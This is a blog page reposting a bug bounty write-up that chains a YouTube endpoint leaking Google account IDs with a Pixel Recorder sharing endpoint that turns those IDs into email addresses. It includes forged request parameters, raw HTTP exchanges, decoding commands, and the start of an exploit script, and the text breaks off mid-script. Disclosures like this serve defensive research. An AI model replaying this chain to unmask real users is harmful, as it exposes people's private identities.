<!DOCTYPE html><html lang="zh-CN" data-astro-cid-sckkx6r4> <head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><link rel="icon" type="image/svg+xml" href="/favicon.svg"><meta name="generator" content="Astro v5.16.1"><meta name="description" content="What could've been the largest data breach in the world - an attack chain on Google services to leak the email address of any YouTube channel"><link rel="canonical" href="https://blog.yuyins.com/reading-list/leaking-the-email-of-any-youtube-user-for-10000-wtri6s/"><!-- Open Graph / Facebook --><meta property="og:type" content="website"><meta property="og:url" content="https://blog.yuyins.com/reading-list/leaking-the-email-of-any-youtube-user-for-10000-wtri6s/"><meta property="og:title" content="Leaking the email of any YouTube user for $10,000"><meta property="og:description" content="What could've been the largest data breach in the world - an attack chain on Google services to leak the email address of any YouTube channel"><meta property="og:image" content="https://blog.yuyins.com/favicon.svg"><!-- Twitter --><meta property="twitter:card" content="summary_large_image"><meta property="twitter:url" content="https://blog.yuyins.com/reading-list/leaking-the-email-of-any-youtube-user-for-10000-wtri6s/"><meta property="twitter:title" content="Leaking the email of any YouTube user for $10,000"><meta property="twitter:description" content="What could've been the largest data breach in the world - an attack chain on Google services to leak the email address of any YouTube channel"><meta property="twitter:image" content="https://blog.yuyins.com/favicon.svg"><title>Leaking the email of any YouTube user for $10,000</title><!-- Theme and color scheme script (runs before page loads to prevent flash) --><script>
			// ÂàùÂßãÂåñÈÖçËâ≤ÊñπÊ°à - ÈªòËÆ§‰ΩøÁî® stone-amber
			const colorScheme = localStorage.getItem('colorScheme') || 'stone-amber';
			document.documentElement.setAttribute('data-color', colorScheme);

			// Âº∫Âà∂‰ΩøÁî®ÊµÖËâ≤‰∏ªÈ¢ò
			document.documentElement.setAttribute('data-theme', 'light');
		</script><link rel="stylesheet" href="/_astro/_slug_.C-G01a-E.css">
<style>.blog-post-container[data-astro-cid-wrgicudb]{width:100%;margin:0 auto;padding:2rem 0}.blog-post[data-astro-cid-wrgicudb]{width:100%;min-width:0;max-width:42rem;margin:0 auto}.article-header[data-astro-cid-wrgicudb]{margin-bottom:2rem;padding-bottom:1rem;border-bottom:1px solid var(--border)}.article-header[data-astro-cid-wrgicudb] h1[data-astro-cid-wrgicudb]{font-size:2rem;line-height:1.3;margin-bottom:1rem;font-weight:700;color:var(--foreground);word-break:break-word}.article-meta[data-astro-cid-wrgicudb]{display:flex;align-items:center;gap:.5rem;font-size:.875rem;color:var(--muted-foreground)}.source-tag[data-astro-cid-wrgicudb]{background-color:var(--muted);color:var(--foreground);padding:.125rem .5rem;border-radius:9999px;font-weight:500;font-size:.75rem;text-decoration:none;transition:opacity .2s}.source-tag[data-astro-cid-wrgicudb]:hover{opacity:.8}.separator[data-astro-cid-wrgicudb]{color:var(--border)}.article-content[data-astro-cid-wrgicudb]{line-height:1.8;margin-bottom:3rem;font-size:1.0625rem;color:var(--foreground)}.article-content[data-astro-cid-wrgicudb] h2{margin-top:2rem;margin-bottom:1rem;font-size:1.5rem;font-weight:600}.article-content[data-astro-cid-wrgicudb] h3{margin-top:1.5rem;margin-bottom:.75rem;font-size:1.25rem;font-weight:600}.article-content[data-astro-cid-wrgicudb] p{margin-bottom:1.25rem}.article-content[data-astro-cid-wrgicudb] a{color:var(--accent);text-decoration:underline;text-underline-offset:2px}.article-content[data-astro-cid-wrgicudb] img{max-width:100%;height:auto;border-radius:.5rem;margin:1.5rem 0}.article-content[data-astro-cid-wrgicudb] blockquote{border-left:4px solid var(--border);padding-left:1rem;margin:1.5rem 0;color:var(--muted-foreground);font-style:italic}.article-content[data-astro-cid-wrgicudb] pre{background:var(--muted);padding:1rem;border-radius:.5rem;overflow-x:auto;font-family:monospace;margin:1.5rem 0}.article-content[data-astro-cid-wrgicudb] ul,.article-content[data-astro-cid-wrgicudb] ol{padding-left:1.5rem;margin-bottom:1.25rem}.article-content[data-astro-cid-wrgicudb] li{margin-bottom:.5rem}.article-footer[data-astro-cid-wrgicudb]{padding-top:2rem;border-top:1px solid var(--border);display:flex;flex-direction:column;gap:1.5rem;align-items:center}.action-row[data-astro-cid-wrgicudb]{display:flex;justify-content:center}.read-original-btn[data-astro-cid-wrgicudb]{display:inline-flex;align-items:center;gap:.5rem;padding:.75rem 1.5rem;background-color:var(--foreground);color:var(--background);border-radius:.5rem;font-weight:500;text-decoration:none;transition:opacity .2s}.read-original-btn[data-astro-cid-wrgicudb]:hover{opacity:.9}.back-to-list[data-astro-cid-wrgicudb]{text-align:center}.back-link[data-astro-cid-wrgicudb]{color:var(--muted-foreground);text-decoration:none;font-size:.875rem;transition:color .2s}.back-link[data-astro-cid-wrgicudb]:hover{color:var(--foreground)}
</style></head> <body data-astro-cid-sckkx6r4> <a id="skip-to-content" href="#main-content" class="sr-only focus:not-sr-only focus:absolute focus:top-4 focus:left-4 focus:z-50 focus:px-4 focus:py-2 focus:bg-accent focus:text-background" data-astro-cid-sckkx6r4>Skip to content</a> <header class="header" data-astro-cid-3ef6ksr2> <nav class="header-nav" aria-label="Main navigation" data-astro-cid-3ef6ksr2> <a href="/" class="header-logo" data-astro-cid-3ef6ksr2>
AstroBlog
</a> <div class="header-links" data-astro-cid-3ef6ksr2> <ul class="nav-list" data-astro-cid-3ef6ksr2> <li data-astro-cid-3ef6ksr2> <a href="/" class="nav-link" data-astro-prefetch="true" data-astro-cid-3ef6ksr2> ÊñáÁ´† </a> </li><li data-astro-cid-3ef6ksr2> <a href="/category" class="nav-link" data-astro-prefetch="true" data-astro-cid-3ef6ksr2> ÂàÜÁ±ª </a> </li><li data-astro-cid-3ef6ksr2> <a href="/reading-list" class="nav-link" data-astro-prefetch="true" data-astro-cid-3ef6ksr2> ËÆ¢ÈòÖ </a> </li><li data-astro-cid-3ef6ksr2> <a href="/about" class="nav-link" data-astro-prefetch="true" data-astro-cid-3ef6ksr2> ÂÖ≥‰∫é </a> </li> </ul> <div class="header-actions" data-astro-cid-3ef6ksr2> <div id="search" data-astro-cid-otpdt6jm> <button id="search-button" class="search-toggle" aria-label="ÊâìÂºÄÊêúÁ¥¢" title="ÊêúÁ¥¢ (‚åòK)" data-astro-cid-otpdt6jm> <svg class="search-icon" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg" data-astro-cid-otpdt6jm> <circle cx="11" cy="11" r="7" stroke="currentColor" stroke-width="2" stroke-linecap="round" data-astro-cid-otpdt6jm></circle> <path d="M20 20L16.5 16.5" stroke="currentColor" stroke-width="2" stroke-linecap="round" data-astro-cid-otpdt6jm></path> </svg> </button> <dialog id="search-dialog" class="search-modal" data-astro-cid-otpdt6jm> <div class="modal-content" data-astro-cid-otpdt6jm> <div class="modal-header" data-astro-cid-otpdt6jm> <h2 class="modal-title" data-astro-cid-otpdt6jm>ÊêúÁ¥¢ÊñáÁ´†</h2> <button id="close-search" class="close-button" aria-label="ÂÖ≥Èó≠ÊêúÁ¥¢" data-astro-cid-otpdt6jm> <svg width="24" height="24" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg" data-astro-cid-otpdt6jm> <path d="M18 6L6 18M6 6l12 12" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" data-astro-cid-otpdt6jm></path> </svg> </button> </div> <div id="pagefind-ui" data-astro-cid-otpdt6jm></div> </div> </dialog> </div> <script type="module">let d=!1;const c="pagefind-loaded";async function l(t=0){if(sessionStorage.getItem(c)==="true")return g(),!0;const r=document.getElementById("pagefind-ui");if(!r)return!1;r.innerHTML='<div style="padding: 2rem; text-align: center; color: var(--muted-foreground);">Âä†ËΩΩ‰∏≠...</div>';try{return await new Promise((o,s)=>{const a=document.createElement("script");a.src="/pagefind/pagefind-ui.js",a.onload=o,a.onerror=s,document.head.appendChild(a)}),g(),sessionStorage.setItem(c,"true"),!0}catch(i){return console.error("Failed to load search:",i),t<2?(console.log(`Retrying search load... (${t+1}/2)`),await new Promise(o=>setTimeout(o,1e3)),l(t+1)):(r&&(r.innerHTML=`
          <div style="padding: 2rem; text-align: center;">
            <p style="color: var(--muted-foreground); margin-bottom: 1rem;">ÊêúÁ¥¢ÂäüËÉΩÂä†ËΩΩÂ§±Ë¥•</p>
            <button id="retry-search" style="padding: 0.5rem 1rem; background: var(--accent); color: var(--accent-foreground); border: none; border-radius: 0.375rem; cursor: pointer;">
              ÈáçËØï
            </button>
          </div>
        `,document.getElementById("retry-search")?.addEventListener("click",()=>{sessionStorage.removeItem(c),l(0)})),!1)}}function g(){typeof PagefindUI<"u"&&(new PagefindUI({element:"#pagefind-ui",showSubResults:!0,showImages:!1,excerptLength:15,translations:{placeholder:"ÊêúÁ¥¢ÊñáÁ´†...",clear_search:"Ê∏ÖÈô§",load_more:"Âä†ËΩΩÊõ¥Â§ö",search_label:"ÊêúÁ¥¢Ê≠§Á´ôÁÇπ",filters_label:"Á≠õÈÄâ",zero_results:"Êú™ÊâæÂà∞ÁªìÊûú [SEARCH_TERM]",many_results:"ÊâæÂà∞ [COUNT] ‰∏™ÁªìÊûú [SEARCH_TERM]",one_result:"ÊâæÂà∞ [COUNT] ‰∏™ÁªìÊûú [SEARCH_TERM]",alt_search:"Êú™ÊâæÂà∞ [SEARCH_TERM] ÁöÑÁªìÊûú„ÄÇÊòæÁ§∫ [DIFFERENT_TERM] ÁöÑÁªìÊûú",search_suggestion:"Êú™ÊâæÂà∞ [SEARCH_TERM] ÁöÑÁªìÊûú„ÄÇÂ∞ùËØï‰ª•‰∏ãÊêúÁ¥¢Ôºö",searching:"ÊêúÁ¥¢‰∏≠ [SEARCH_TERM]..."}}),setTimeout(()=>{const t=document.querySelector(".pagefind-ui__search-input");t instanceof HTMLElement&&t.focus()},100))}function u(){if(d)return;d=!0;const t=document.getElementById("search-button"),n=document.getElementById("search-dialog"),r=document.getElementById("close-search");if(!t||!n||!r)return;let i=sessionStorage.getItem(c)==="true";const o=async()=>{n.showModal(),document.body.style.overflow="hidden",i?setTimeout(()=>{const e=document.querySelector(".pagefind-ui__search-input");e instanceof HTMLElement&&e.focus()},100):await l()&&(i=!0)},s=()=>{n.close(),document.body.style.overflow=""},a=e=>{e.target===n&&s()},m=e=>{e.key==="Escape"&&n.open&&s()},f=e=>{(e.metaKey||e.ctrlKey)&&e.key==="k"&&(e.preventDefault(),n.open?s():o())};t.addEventListener("click",o),r.addEventListener("click",s),n.addEventListener("click",a),document.addEventListener("keydown",m),document.addEventListener("keydown",f),document.addEventListener("astro:before-swap",()=>{t.removeEventListener("click",o),r.removeEventListener("click",s),n.removeEventListener("click",a),document.removeEventListener("keydown",m),document.removeEventListener("keydown",f),d=!1},{once:!0})}document.readyState==="loading"?document.addEventListener("DOMContentLoaded",u):u();document.addEventListener("astro:page-load",u);</script> <link href="/pagefind/pagefind-ui.css" rel="stylesheet">  </div> </div> </nav> </header>  <main id="main-content" data-pagefind-body class="main-content main-content--wide" data-astro-cid-sckkx6r4>  <div class="blog-post-container" data-astro-cid-wrgicudb> <article class="blog-post" data-astro-cid-wrgicudb> <header class="article-header" data-astro-cid-wrgicudb> <h1 data-astro-cid-wrgicudb>Leaking the email of any YouTube user for $10,000</h1> <div class="article-meta" data-astro-cid-wrgicudb> <a href="https://brutecat.com" target="_blank" rel="noopener noreferrer" class="source-tag" data-astro-cid-wrgicudb>brutecat.com</a> <span class="separator" data-astro-cid-wrgicudb>¬∑</span> <time data-astro-cid-wrgicudb>2025Âπ¥2Êúà12Êó•</time> </div> </header> <!-- Render HTML content from RSS feed --> <div class="article-content app-prose" data-astro-cid-wrgicudb><p>Some time ago, I was looking for a research target in Google and was digging through the <a href="https://staging-people-pa.sandbox.googleapis.com/$discovery/rest?key=AIzaSyBOh-LSTdP2ddSgqPk6ceLEKTb8viTIvdw" >Internal People API (Staging)</a> discovery document until I noticed something interesting:</p>
</br>

<pre><code class="hljs language-json">   <span class="hljs-attr">&quot;BlockedTarget&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
      <span class="hljs-attr">&quot;id&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;BlockedTarget&quot;</span><span class="hljs-punctuation">,</span>
      <span class="hljs-attr">&quot;description&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;The target of a user-to-user block, used to specify creation/deletion of blocks.&quot;</span><span class="hljs-punctuation">,</span>
      <span class="hljs-attr">&quot;type&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;object&quot;</span><span class="hljs-punctuation">,</span>
      <span class="hljs-attr">&quot;properties&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
        <span class="hljs-attr">&quot;profileId&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
          <span class="hljs-attr">&quot;description&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;Required. The obfuscated Gaia ID of the user targeted by the block.&quot;</span><span class="hljs-punctuation">,</span>
          <span class="hljs-attr">&quot;type&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;string&quot;</span>
        <span class="hljs-punctuation">}</span><span class="hljs-punctuation">,</span>
        <span class="hljs-attr">&quot;fallbackName&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
          <span class="hljs-attr">&quot;description&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;Required for `BlockPeopleRequest`. A display name for the user being blocked. The viewer may see this in other surfaces later, if the blocked user has no profile name visible to them. Notes: * Required for `BlockPeopleRequest` (may not currently be enforced by validation, but should be provided) * For `UnblockPeopleRequest` this does not need to be set.&quot;</span><span class="hljs-punctuation">,</span>
          <span class="hljs-attr">&quot;type&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;string&quot;</span>
        <span class="hljs-punctuation">}</span>
      <span class="hljs-punctuation">}</span>
    <span class="hljs-punctuation">}</span><span class="hljs-punctuation">,</span></code></pre></br>

<p>It seemed the Google-wide block user functionality was based on an obfuscated Gaia ID as well as a display name for that blocked user. The obfuscated Gaia ID is just a Google account identifier.<br></br></p>
<p>That seemed perfectly fine until I remembered <a href="https://support.google.com/accounts/answer/6388749#zippy=%2Cuse-youtube-to-block-an-account" >this support page</a>:<br></br></p>
<p><img src="/assets/leaking-youtube-emails/use_youtube_to_block.png" alt=""  /></p>
</br>

<p>So, if you block someone on YouTube, you can leak their Google account identifier? I tested it out. I went to a random livestream, blocked a user and sure enough, it showed up in <a href="https://myaccount.google.com/blocklist" >https://myaccount.google.com/blocklist</a><br></br></p>
<p><img src="/assets/leaking-youtube-emails/blocked_user.png" alt=""  /></p>
<p>The fallback name was set as their channel name <strong>Mega Prime</strong> and the profile ID was their obfuscated Gaia ID <strong>107183641464576740691</strong><br></br></p>
<p>This was super strange to me because YouTube should never leak the underlying Google account of a YouTube channel. In the past, there&#39;s been several bugs to <a href="https://sector035.nl/articles/2022-35" >resolve these to an email address</a>, so I was confident there was still a Gaia ID to Email in some old obscure Google product.</p>
<h3 id="escalating-this-to-4-billion-youtube-channels">Escalating this to 4 billion YouTube channels</h3><p>So, we can leak the Gaia ID of any live chat user, but can we escalate this to all channels on YouTube? As it turns out, when you click the 3 dots just to open the context menu, a request is fired:</p>
</br>

<p><img src="/assets/leaking-youtube-emails/context_menu.png" alt=""  /></p>
</br>

<p><strong>Request</strong></p>
<pre><code class="hljs language-http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/youtubei/v1/live_chat/get_item_context_menu?params=R2lrcUp3b1lWVU5vY3pCd1UyRkZiMDVNVmpSdFpYWkNSa2RoYjB0QkVnc3pObGx1VmpsVFZFSnhZeklhQ2hoVlExTkZMV0ZaVDJJdGRVTm5NRFU1Y1VoU2FYTmZiM2M9&amp;pbj=1&amp;prettyPrint=false</span> <span class="hljs-meta">HTTP/2</span>
<span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>www.youtube.com
<span class="hljs-attribute">Cookie</span><span class="hljs-punctuation">: </span>&lt;redacted&gt;</code></pre><p><strong>Response</strong></p>
<pre><code class="hljs language-http"><span class="hljs-meta">HTTP/2</span> <span class="hljs-number">200</span> OK
<span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/json; charset=UTF-8
<span class="hljs-attribute">Server</span><span class="hljs-punctuation">: </span>scaffolding on HTTPServer2

<span class="language-bash">{
  ...
  <span class="hljs-string">&quot;serviceEndpoint&quot;</span>: {
    ...
    <span class="hljs-string">&quot;commandMetadata&quot;</span>: {
      <span class="hljs-string">&quot;webCommandMetadata&quot;</span>: {
        <span class="hljs-string">&quot;sendPost&quot;</span>: <span class="hljs-literal">true</span>,
        <span class="hljs-string">&quot;apiUrl&quot;</span>: <span class="hljs-string">&quot;/youtubei/v1/live_chat/moderate&quot;</span>
      }
    },
    <span class="hljs-string">&quot;moderateLiveChatEndpoint&quot;</span>: {
      <span class="hljs-string">&quot;params&quot;</span>: <span class="hljs-string">&quot;Q2lrcUp3b1lWVU5vY3pCd1UyRkZiMDVNVmpSdFpYWkNSa2RoYjB0QkVnc3pObGx1VmpsVFZFSnhZMUFBV0FGaUx3b1ZNVEV6T1RBM05EWTJOVE0zTmpjd016Y3dOVGt3RWhaVFJTMWhXVTlpTFhWRFp6QTFPWEZJVW1selgyOTNjQUElM0Q=&quot;</span>
    }
  }
  ...
}</span></code></pre><p>That <code>params</code> is nothing more than just base64 encoded protobuf, which is a common encoding format used throughout Google.<br></br></p>
<p>If we try decoding that <code>moderateLiveChatEndpoint</code> params:</p>
<pre><code class="hljs language-bash">$ <span class="hljs-built_in">echo</span> -n <span class="hljs-string">&quot;Q2lrcUp3b1lWVU5vY3pCd1UyRkZiMDVNVmpSdFpYWkNSa2RoYjB0QkVnc3pObGx1VmpsVFZFSnhZMUFBV0FGaUx3b1ZNVEV6T1RBM05EWTJOVE0zTmpjd016Y3dOVGt3RWhaVFJTMWhXVTlpTFhWRFp6QTFPWEZJVW1selgyOTNjQUElM0Q=&quot;</span> | <span class="hljs-built_in">base64</span>
 -d | sed <span class="hljs-string">&#x27;s/%3D/=/g&#x27;</span> | <span class="hljs-built_in">base64</span> -d | protoc --decode_raw
1 {
  5 {
    1: <span class="hljs-string">&quot;UChs0pSaEoNLV4mevBFGaoKA&quot;</span>
    2: <span class="hljs-string">&quot;36YnV9STBqc&quot;</span>
  }
}
10: 0
11: 1
12 {
  1: <span class="hljs-string">&quot;113907466537670370590&quot;</span>
  2: <span class="hljs-string">&quot;SE-aYOb-uCg059qHRis_ow&quot;</span>
}
14: 0</code></pre><p>It actually just contains the Gaia ID of the user we want to block, we don&#39;t even need to block them!</p>
<p>Let&#39;s check out the <code>get_item_context_menu</code> requests params too:</p>
<pre><code class="hljs language-bash">$ <span class="hljs-built_in">echo</span> -n <span class="hljs-string">&quot;R2lrcUp3b1lWVU5vY3pCd1UyRkZiMDVNVmpSdFpYWkNSa2RoYjB0QkVnc3pObGx1VmpsVFZFSnhZeklhQ2hoVlExTkZMV0ZaVDJJdGRVTm5NRFU1Y1VoU2FYTmZiM2M9&quot;</span> | <span class="hljs-built_in">base64</span> -d | sed <span class="hljs-string">&#x27;s/%3D/=/g&#x27;</span> | <span class="hljs-built_in">base64</span> -d | protoc --decode_raw
3 {
  5 {
    1: <span class="hljs-string">&quot;UChs0pSaEoNLV4mevBFGaoKA&quot;</span>
    2: <span class="hljs-string">&quot;36YnV9STBqc&quot;</span>
  }
}
6 {
  1: <span class="hljs-string">&quot;UCSE-aYOb-uCg059qHRis_ow&quot;</span>
}</code></pre><p>Seems to just contain the channel ID of the channel we&#39;re blocking, the livestream video ID and livestream author ID. Let&#39;s try to fake the request params with our own target&#39;s channel ID.<br></br></p>
<p>For this test, we&#39;ll use a <a href="https://www.youtube.com/channel/UCD2LZAT1j1DyVXq2R2BdusQ" >Topic Channel</a> since they are <a href="https://support.google.com/youtube/answer/7636475#topicchannels" >auto-generated by YouTube</a> and guaranteed to not have any live chat messages.</p>
<pre><code class="hljs language-bash">$ <span class="hljs-built_in">echo</span> -n <span class="hljs-string">&quot;&lt;SNIP&gt;&quot;</span> | <span class="hljs-built_in">base64</span> -d | sed <span class="hljs-string">&#x27;s/%3D/=/g&#x27;</span> | <span class="hljs-built_in">base64</span> -d | sed <span class="hljs-string">&#x27;s/UCSE-aYOb-uCg059qHRis_ow/UCD2LZAT1j1DyVXq2R2BdusQ/g&#x27;</span> | <span class="hljs-built_in">base64</span> | <span class="hljs-built_in">base64</span>
R2lrcUp3b1lWVU5vY3pCd1UyRkZiMDVNVmpSdFpYWkNSa2RoYjB0QkVnc3pObGx1VmpsVFZFSnhZeklhQ2hoVlEwUXlURnBCVkRGcQpNVVI1VmxoeE1sSXlRbVIxYzFFPQo=</code></pre></br>

<p>Testing this on <code>/youtubei/v1/live_chat/get_item_context_menu</code>:</p>
<pre><code class="hljs language-json">...
<span class="hljs-attr">&quot;moderateLiveChatEndpoint&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">{</span><span class="hljs-attr">&quot;params&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;Q2lrcUp3b1lWVU5vY3pCd1UyRkZiMDVNVmpSdFpYWkNSa2RoYjB0QkVnc3pObGx1VmpsVFZFSnhZMUFBV0FGaUx3b1ZNVEF6TWpZeE9UYzBNakl4T0RJNU9Ea3lNVFkzRWhaRU1reGFRVlF4YWpGRWVWWlljVEpTTWtKa2RYTlJjQUElM0Q=&quot;</span><span class="hljs-punctuation">}</span>
...</code></pre><pre><code class="hljs language-bash"><span class="hljs-built_in">echo</span> -n <span class="hljs-string">&quot;Q2lrcUp3b1lWVU5vY3pCd1UyRkZiMDVNVmpSdFpYWkNSa2RoYjB0QkVnc3pObGx1VmpsVFZFSnhZMUFBV0FGaUx3b1ZNVEF6TWpZeE9UYzBNakl4T0RJNU9Ea3lNVFkzRWhaRU1reGFRVlF4YWpGRWVWWlljVEpTTWtKa2RYTlJjQUElM0Q=&quot;</span> | <span class="hljs-built_in">base64</span> -d | sed <span class="hljs-string">&#x27;s/%3D/=/g&#x27;</span> | <span class="hljs-built_in">base64</span> -d | protoc --decode_raw
1 {
  5 {
    1: <span class="hljs-string">&quot;UChs0pSaEoNLV4mevBFGaoKA&quot;</span>
    2: <span class="hljs-string">&quot;36YnV9STBqc&quot;</span>
  }
}
10: 0
11: 1
12 {
  1: <span class="hljs-string">&quot;103261974221829892167&quot;</span>
  2: <span class="hljs-string">&quot;D2LZAT1j1DyVXq2R2BdusQ&quot;</span>
}
14: 0</code></pre><p>We can leak the Gaia ID of the channel - <strong>103261974221829892167</strong></p>
<h3 id="the-missing-puzzle-piece-pixel-recorder">The missing puzzle piece: Pixel Recorder</h3><p>I told my friend <a href="https://schizo.org" >nathan</a> about the YouTube Gaia ID leak and we started looking into old forgotten Google products since they probably contained some bug or logic flaw to resolve a Gaia ID to an email. <a href="https://recorder.google.com" >Pixel Recorder</a> was one of them. Nathan made a test recording on his Pixel phone and synced it to his Google account so we could access the endpoints on the web at <a href="https://recorder.google.com" >https://recorder.google.com</a>:<br></br></p>
<p><img src="/assets/leaking-youtube-emails/recorder_home_page.png" alt=""  /></p>
</br>

<p>When we tried sharing the recording to a test email, that&#39;s when it hit us:</p>
</br>

<p><strong>Request</strong></p>
<pre><code class="hljs language-http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/$rpc/java.com.google.wireless.android.pixel.recorder.protos.PlaybackService/WriteShareList</span> <span class="hljs-meta">HTTP/2</span>
<span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>pixelrecorder-pa.clients6.google.com
<span class="hljs-attribute">Cookie</span><span class="hljs-punctuation">: </span>&lt;redacted&gt;
<span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>80
<span class="hljs-attribute">Authorization</span><span class="hljs-punctuation">: </span>&lt;redacted&gt;
<span class="hljs-attribute">X-Goog-Api-Key</span><span class="hljs-punctuation">: </span>AIzaSyCqafaaFzCP07GzWUSRw0oXErxSlrEX2Ro
<span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/json+protobuf
<span class="hljs-attribute">Referer</span><span class="hljs-punctuation">: </span>https://recorder.google.com/

<span class="language-javascript">[<span class="hljs-string">&quot;7adab89e-4ace-4945-9f75-6fe250ccbe49&quot;</span>,<span class="hljs-literal">null</span>,[[<span class="hljs-string">&quot;113769094563819690011&quot;</span>,<span class="hljs-number">2</span>,<span class="hljs-literal">null</span>]]]</span></code></pre></br>

<p><strong>Response</strong></p>
<pre><code class="hljs language-http"><span class="hljs-meta">HTTP/2</span> <span class="hljs-number">200</span> OK
<span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/json+protobuf; charset=UTF-8
<span class="hljs-attribute">Server</span><span class="hljs-punctuation">: </span>ESF
<span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>138

<span class="language-javascript">[<span class="hljs-string">&quot;28bc3792-9bdb-4aed-9a78-17b0954abc7d&quot;</span>,[[<span class="hljs-literal">null</span>,<span class="hljs-number">2</span>,<span class="hljs-string">&quot;vrptest2@gmail.com&quot;</span>]]]</span></code></pre><p>This endpoint was taking in the obfuscated Gaia ID and... <strong>returning the email?</strong><br></br></p>
<p>We tested this with the obfuscated Gaia ID <code>107183641464576740691</code> we got from blocking that user on YouTube a while back and <strong>it worked</strong>:</p>
<pre><code class="hljs language-http"><span class="hljs-meta">HTTP/2</span> <span class="hljs-number">200</span> OK
<span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/json+protobuf; charset=UTF-8
<span class="hljs-attribute">Server</span><span class="hljs-punctuation">: </span>ESF
<span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>138

<span class="language-javascript">[<span class="hljs-string">&quot;28bc3792-9bdb-4aed-9a78-17b0954abc7d&quot;</span>,[[<span class="hljs-literal">null</span>,<span class="hljs-number">2</span>,<span class="hljs-string">&quot;redacted@gmail.com&quot;</span>],[<span class="hljs-literal">null</span>,<span class="hljs-number">2</span>,<span class="hljs-string">&quot;vrptest2@gmail.com&quot;</span>]]]</span></code></pre><h3 id="a-small-problem-preventing-notification-to-the-target">A small problem: preventing notification to the target</h3><p>It seems that whenever we share a recording with a victim, they receive an email that looks like this:<br></br></p>
<p><img src="/assets/leaking-youtube-emails/recorder_victim.png" alt=""  /></p>
</br>

<p>This is <strong>really bad</strong>, and it would lower the impact of the bug quite a lot. On the share pop-up, there didn&#39;t seem to be any option to disable notifications.</p>
<p><img src="/assets/leaking-youtube-emails/share_recording.png" alt=""  /></p>
<p>I tried leaking the full request proto via my tool <a href="https://github.com/ddd/req2proto" >req2proto</a>, but there was nothing about disabling the email notification:</p>
</br>

<pre><code class="hljs language-proto">syntax = <span class="hljs-string">&quot;proto3&quot;</span>;

<span class="hljs-keyword">package</span> java.com.google.wireless.android.pixel.recorder.protos;

<span class="hljs-keyword">import</span> <span class="hljs-string">&quot;java/com/google/wireless/android/pixel/recorder/sharedclient/acl/protos/message.proto&quot;</span>;

<span class="hljs-keyword">message </span><span class="hljs-title class_">WriteShareListRequest</span> {
  <span class="hljs-type">string</span> recording_id = <span class="hljs-number">1</span>;
  <span class="hljs-type">string</span> delete_obfuscated_gaia_ids = <span class="hljs-number">2</span>;
  ShareUser update_shared_users = <span class="hljs-number">3</span>;
  <span class="hljs-type">string</span> sharing_message = <span class="hljs-number">4</span>;
}

<span class="hljs-keyword">message </span><span class="hljs-title class_">ShareUser</span> {
  <span class="hljs-type">string</span> obfuscated_gaia_id = <span class="hljs-number">1</span>;
  java.com.google.wireless.android.pixel.recorder.sharedclient.acl.protos.ResourceAccessRole role = <span class="hljs-number">2</span>;
  <span class="hljs-type">string</span> email = <span class="hljs-number">3</span>;
}</code></pre></br>

<p>Even trying to add and remove the user at the same time didn&#39;t work, the email was still sent. But that&#39;s when we realized - if it&#39;s including our recording title in the email subject, perhaps it wouldn&#39;t be able to send an email if our recording title was too long.<br></br></p>
<p>We hacked together a quick python script to test this out:</p>
</br>

<pre><code class="hljs language-python"><span class="hljs-keyword">import</span> requests

BASE_URL = <span class="hljs-string">&quot;https://pixelrecorder-pa.clients6.google.com/$rpc/java.com.google.wireless.android.pixel.recorder.protos.PlaybackService/&quot;</span>

headers = {
    <span class="hljs-string">&quot;Host&quot;</span>: <span class="hljs-string">&quot;pixelrecorder-pa.clients6.google.com&quot;</span>,
    <span class="hljs-string">&quot;Content-Type&quot;</span>: <span class="hljs-string">&quot;application/json+protobuf&quot;</span>,
    <span class="hljs-string">&quot;X-Goog-Api-Key&quot;</span>: <span class="hljs-string">&quot;AIzaSyCqafaaFzCP07GzWUSRw0oXErxSlrEX2Ro&quot;</span>,
    <span class="hljs-string">&quot;Origin&quot;</span>: <span class="hljs-string">&quot;https://recorder.google.com&quot;</span>
}

<span class="hljs-keyword">def</span> <span class="hljs-title function_">get_recording_uuid</span>(<span class="hljs-params">share_id: <span class="hljs-built_in">str</span></span>):
    payload = <span class="hljs-string">f&quot;[\&quot;<span class="hljs-subst">{share_id}</span>\&quot;]&quot;</span>
    response = requests.post(BASE_URL + <span class="hljs-string">&quot;GetRecordingInfo&quot;</span> + <span class="hljs-string">&quot;?alt=json&quot;</span>, headers=headers, data=payload)
    <span class="hljs-keyword">if</span> response.status_code != <span class="hljs-number">200</span>:
        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;unknown error when getting recording uuid: &quot;</span>, response.json())
        exit(<span class="hljs-number">1</span>)
    <span class="hljs-keyword">try</span>:
        response = response.json()
    <span class="hljs-keyword">except</span>:
        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;can\&#x27;t parse response when getting recording uuid: &#x27;</span>, response.text)
        exit(<span class="hljs-number">1</span>)

